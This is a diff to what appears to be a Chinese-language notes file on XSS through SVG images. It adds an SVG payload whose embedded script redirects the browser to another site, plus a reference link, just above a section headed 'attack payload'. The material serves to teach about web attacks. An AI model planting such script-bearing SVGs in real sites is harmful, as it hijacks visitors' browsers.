@@ -26,9 +26,21 @@
 </foreignObject>
 </svg>
 ```
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      window.location.href="http://www.baidu.com"
+   </script>
+</svg>
+```
+
 来源：
 - https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/
 - https://www.cnblogs.com/r00tgrok/p/svg_build_xss_vector_bypass_firefox_and_chrome.html
+- http://ghostlulz.com/xss-svg/
 
 
 ## 攻击payload
